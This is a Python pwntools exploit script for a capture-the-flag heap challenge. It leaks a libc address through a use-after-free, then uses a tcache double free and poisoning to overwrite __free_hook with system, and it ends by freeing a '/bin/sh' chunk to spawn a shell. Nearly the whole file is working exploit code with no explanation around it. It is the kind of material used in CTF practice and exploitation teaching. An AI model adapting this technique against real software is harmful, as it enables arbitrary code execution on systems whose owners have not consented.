from pwn import *

io = process("./heap")
#io = remote("node4.anna.nssctf.cn", 28263)
libc = ELF("./pwn/libc.so.6")


def select(id: int):
    io.recvuntil(b">>")
    io.sendline(str(id).encode())


def create(idx: int, size: int):
    select(1)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"size? ")
    io.sendline(str(size).encode())
    print("create ", idx)


def delete(idx: int):
    select(2)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())
    print("delete ", idx)


def show(idx: int):
    select(3)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())


def edit(idx: int, content: bytes):
    select(4)
    io.recvuntil(b"idx? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"content : ")
    io.send(content)


def _debug():
    gdb.attach(io)


create(0, 0x420)
create(1, 0x10)
delete(0)
show(0)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x1ECBE0
print("libc base =", hex(libc_base))
malloc_hook = libc_base + libc.sym["__malloc_hook"]
free_hook = libc_base + libc.sym["__free_hook"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.sym["system"]
create(2, 0x80)
create(3, 0x80)
delete(2)
edit(2, p64(0) * 2)
delete(2)
# 这里的会无限 menu，实际是打通的吧，反正用不了。  
#edit(2, p64(malloc_hook))
#create(4, 0x80)
#create(5, 0x80)
#edit(5, p64(system))
#create(6, p64(binsh))

edit(2, p64(free_hook))
create(4, 0x80)
create(5, 0x80)
create(6, 0x80)
edit(5, p64(system))
edit(6, b"/bin/sh\x00")
delete(6)
io.interactive()
